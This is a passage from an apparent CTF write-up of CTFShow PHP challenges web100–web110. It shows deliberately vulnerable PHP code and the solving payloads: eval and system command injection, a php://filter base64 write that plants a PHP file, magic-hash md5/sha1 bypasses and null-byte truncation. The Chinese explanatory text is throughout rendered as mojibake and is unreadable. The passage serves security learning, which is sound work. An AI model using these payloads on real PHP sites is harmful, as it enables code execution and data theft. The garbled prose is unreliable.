if(!preg_match(&quot;/\;/&quot;, $v2))&#123;</span><br><span class="line">        if(preg_match(&quot;/\;/&quot;, $v3))&#123;</span><br><span class="line">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>is_numeric()æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²</li>
<li>$v1æ˜¯æ•°å­—ï¼Œ$v2ä¸èƒ½æœ‰åˆ†å·,$v3æœ‰åˆ†å·ï¼Œç„¶è€Œ is_numeric()æ˜¯æ£€æµ‹æ•°å­—çš„ï¼Œè€Œ$v2å’Œ$v3æœ‰åˆ†å·ï¼Œæ²¡åˆ†å·ï¼Œè¿™ä¸å°±çŸ›ç›¾äº†å—ï¼Ÿï¼Ÿï¼Ÿ</li>
<li>æ³¨æ„ and &amp;&amp; or || çš„åŒºåˆ«ï¼›and çš„ä¼˜å…ˆçº§ä½äº&amp;&amp;ä¹Ÿä½äº=ï¼›æ‰€ä»¥ $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); å…ˆæ‰§è¡Œ = èµ‹å€¼å°† $v1èµ‹å€¼ç»™ $v0,åé¢çš„è¢«å¿½ç•¥</li>
<li>æœ¬é¢˜æ²¡æœ‰å¯¹å‘½ä»¤è¿›è¡Œè¿‡æ»¤</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web100.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=show_source(<span class="string">&#x27;ctfshow.php&#x27;</span>)&amp;v3=;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web100_1.png"></p>
<p>å¦‚ä¸Šå›¾æ˜¾ç¤ºå‡º: $flag_is_c2ec8d720x2dd1960x2d46250x2daa520x2d967b8bad6aba å…¶ä¸­ 0x2dä¸ºåå…­è¿›åˆ¶ â€˜-â€˜ (çŸ­æ¨ªçº¿),å°†å…¶æ›¿æ¢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;c2ec8d72-d196-<span class="number">4625</span>-aa52-<span class="number">967</span>b8bad6aba&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-22 00:26:48</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">//flag in class ctfshow;</span><br><span class="line">$ctfshow = new ctfshow();</span><br><span class="line">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v0)&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;, $v2))&#123;</span><br><span class="line">        if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;, $v3))&#123;</span><br><span class="line">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>æ­£åˆ™åŒ¹é…äº†ä¸€å¤§å †ä¸œè¥¿</li>
<li>æ¶‰åŠäº†æ–°çŸ¥è¯† åå°„ç±»</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2= <span class="keyword">echo</span> <span class="keyword">new</span> Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web101.png"></p>
<p>è¿™ä¸ª flagåé¢å·®ä¸€ä¸ªï¼Œä» 0-9,a-f çŒœä¸€ä¸ª</p>
<h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: atao</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-23 20:59:43</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $s = substr($v2,2);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    echo $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>$v4 = is_numeric($v2) and is_numeric($v3); åªè¦ $v2æ˜¯æ•°å­—å°±è¡Œï¼Œåœ¨PHP ä¸­and å’Œ &amp;&amp; çš„ä¼˜å…ˆçº§ä¸åŒ</li>
<li>substr($v2,2)è¡¨ç¤ºå­—ç¬¦ä¸²$v2ä»ç¬¬äºŒä½å¼€å§‹æˆªå–ä¸€ç›´åˆ°æœ€å</li>
<li>call_user_func($v1,$s)è¡¨ç¤ºæŠŠ$v1ä½œä¸ºå›è°ƒå‡½æ•°(å¯ä»¥æ˜¯ç³»ç»Ÿå‡½æ•°æˆ–è‡ªå®šä¹‰å‡½æ•°)ï¼Œ$såˆ™ä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web102.png"></p>
<ol start="4">
<li>æŸ¥çœ‹äº†æç¤º (ğŸ‚ğŸº) hexbin() è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li>
<li>/v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-<br>decode/resource=1.php post:v1=hex2bin</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web102_1.png"></p>
<ol start="6">
<li>å†æŸ¥çœ‹1.php å³é”®æºç å³å¯å¾—åˆ°flag</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web102_2.png"></p>
<h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: atao</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-23 21:03:24</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $s = substr($v2,2);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    echo $str;</span><br><span class="line">    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;</span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&#x27;Sorry&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>ä¸ä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œå¤šäº†æ­£åˆ™åŒ¹é…ä»»ç„¶å¯ä»¥ç”¨ä¸Šä¸€ä¸ªæ–¹æ³•</li>
</ol>
<h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: atao</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-28 22:27:20</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">    if(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>shal() å‡½æ•°ç®—å­—ç¬¦ä¸²çš„ sha1 æ•£åˆ—å€¼ , </li>
<li>æ­¤é¢˜ä¸ md5() çš„è§£æ³•ç±»ä¼¼ï¼Œéƒ½ä¸èƒ½å¤„ç†æ•°ç»„ä¸”ä¸ºè‹¥æ¯”è¾ƒ</li>
<li> ?v2[]=1 post: v1[]=2</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web104.png"></p>
<ol start="4">
<li>?v2=aaK1STfY post:v1=aaO8zKZF</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web104_1.png"></p>
<ol start="5">
<li>å…¶ä¸­ aaK1STfYçš„ sha1çš„å€¼ä¸º 0e76658526655756207688271159624026011393</li>
<li>å…¶ä¸­ aaO8zKZFçš„ sha1çš„å€¼ä¸º 0e89257456677279068558073954252716165668</li>
<li>å®ƒä»¬ä¸¤è€…ä½¿ç”¨è‹¥æ¯”è¾ƒä¸”0eçš„ç§‘å­¦è®¡æ•°æ³•çš„å€¼éƒ½ä¸º0 å› æ­¤å¯ä»¥ç»•è¿‡</li>
</ol>
<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:34:07</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ol>
<li>$$ä¸ºå¯å˜å˜é‡ï¼Œå³å˜é‡è¦†ç›–ã€‚</li>
<li>ä¾‹å¦‚ $a=â€™Aâ€™; $$a=â€™Zâ€™, $A=Z; $$aå…ˆæŠŠåé¢$aè§£æä¸ºâ€™Aâ€™,ç„¶å Aä½œä¸ºå˜é‡$Aç­‰äºZ</li>
<li>æ‡’å¾—ç»„ç»‡è¯­è¨€</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web105.png"></p>
<h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: atao</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-28 22:38:27</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ol>
<li>ä¸ web104ä¸€æ ·</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web106.png"></p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web106_1.png"></p>
<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-28 23:24:14</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">       parse_str($v1,$v2);</span><br><span class="line">       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;</span><br><span class="line">           echo $flag;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>parse_str() å°†å­—ç¬¦è§£ææˆå¤šä¸ªå˜é‡ã€‚</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web107.png"></p>
<ul>
<li>æ³¨æ„è¿™å¥è¯ï¼š å¦‚æœè®¾ç½®åˆ—ç¬¬äºŒä¸ªå˜é‡ resultï¼Œå˜é‡å°†ä¼šä»¥æ•°ç»„å…ƒç´ çš„å½¢å¼å­˜å…¥åˆ°è¿™ä¸ªæ•°ç»„ï¼Œä½œä¸ºä»£æ›¿ã€‚è¿™ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿï¼Ÿï¼Ÿçœ‹ä¸‹å›¾</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web107_1.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤ºï¼šç¬¬äºŒä¸ªå‚æ•° output,ä½œä¸ºäº†ä¸‹é¢ä¸‰ä¸ªechoä¸­çš„æ•°ç»„å,è€Œç´¢å¼•ï¼šfirst, arr, arr éƒ½ä¸º ç›®æ ‡å­—ç¬¦ä¸²ä¸­çš„å†…å®¹ï¼›å› æ­¤åœ¨æœ¬é¢˜å½“ä¸­: $v2[â€˜flagâ€™] ä¸­ç´¢å¼• flag å¿…é¡»ä¸º å­—ç¬¦ä¸²v1ä¸­çš„å†…å®¹ï¼Œæ‰€ä»¥ç›®å‰ v1=flag=what what what</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>åŒæ—¶è€ƒå¯Ÿ md5() çš„å¼±æ¯”è¾ƒï¼Œå°† $v3 MD5ç¼–ç è¿‡åä¸ 1=flag=what what what æ¥æ¯”è¾ƒï¼›å› æ­¤å°±æœ‰å¦‚ä¸‹:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v3=QNKCDZO</span><br><span class="line"><span class="comment">// mdt(QNKCDZO) = 0e830400451993494058024219903391 // md5ç¼–ç ä¸º0eçš„ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”å€¼ä¸º 0 </span></span><br><span class="line">post:</span><br><span class="line">v1=flag=<span class="number">0e462097431906509019562988736854</span> <span class="comment">// md5ç¼–ç ä¸º0eçš„ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”å€¼ä¸º 0 æ­¤å¤„å¯ç®€å†™ v1=flag=0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>æ­¤æ—¶ 0 == 0 ä¸º True å³å¯å¾—åˆ°flag</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web107_2.png"></p>
<h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><p>æºç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-28 23:53:55</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;</span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span><br><span class="line">if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>ereg() ä¸ºæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼ŒåŒ¹é…åˆ°è¿”å› TRUE,å¦åˆ™è¿”å› FALSEä½†ä¼šè¢« %00æˆªæ–­</li>
<li>strrev() å‡½æ•°ä¸ºåè½¬å­—ç¬¦ä¸²</li>
<li>intval() è·å–å˜é‡çš„æ•´æ•°å€¼</li>
<li>è¦ç»•è¿‡ç¬¬ä¸€ä¸ªif å¯ä»¥ ?c=a%00xxxxï¼Œæ­¤æ—¶ç¨‹åºåªè®¤è¯†%00å‰é¢çš„ a å°±ä¼šè¿”å›TRUE å³å¯ç»•è¿‡è¿™ä¸ªifä»è€Œä¸ä¼šç‹—å¸¦</li>
<li>ç¬¬äºŒä¸ªif() å°†ä¼ å…¥çš„å­—ç¬¦ä¸²å…ˆåè½¬å†å–æ•´æ•°å€¼: </li>
<li>0x36dä¸ºåå…­è¿›åˆ¶ï¼Œè½¬æ¢ä¸ºåè¿›åˆ¶ä¸ºï¼š 877</li>
<li>ç»¼ä¸Šæ‰€è¿°æœ‰: ?c=a%00778ï¼Œé‚£ä¹ˆ778åè½¬è¿‡æ¥ä¸º 877 , 877 == 0x36d å³å¯å¾—åˆ° flag</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web108_1.png"></p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web108.png"></p>
<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p>æºç ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-29 22:02:34</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>è¿™é“é¢˜ä¸»è¦è€ƒå¯Ÿ å†…ç½®ç±»ğŸ‚ğŸº : Exception (PHPå¼‚å¸¸å¤„ç†)ï¼Œè¯¦æƒ…ç™¾åº¦</li>
<li>PHPå˜é‡åè·Ÿæ‹¬å·ï¼šphp å˜é‡å‡½æ•° å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHPå°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œå¹¶ä¸”å°†å°è¯•æ‰§è¡Œå®ƒã€‚</li>
<li>?v1=Exception&amp;v2=system(â€˜tac fl36dg.txtâ€™)</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web109.png"></p>
<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-29 22:49:10</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>è¿™é“é¢˜åŒæ ·è€ƒå¯Ÿ å†…ç½®ç±»çš„ç”¨æ³•ä¸”è¿‡æ»¤äº†è¿™ä¹ˆå¤šç¬¦å·</li>
<li>çœ‹äº†å¤§ä½¬çš„åšæ³•</li>
<li>?v1=FilesystemIterator&amp;v2=getcwd</li>
<li>åˆ©ç”¨äº† FilesystemIteratorç±»ä¸getcwd(è·å–å½“å‰å·¥ä½œç›®å½•) æ¥è¯»å–ç›®å½•ä¸­çš„å†…å®¹</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web110.png"></p>
<ul>
<li>å†è®¿é—®è¿™ä¸ªæ–‡ä»¶</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web110_1.png"></p>
<h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><p>æºç :</p>
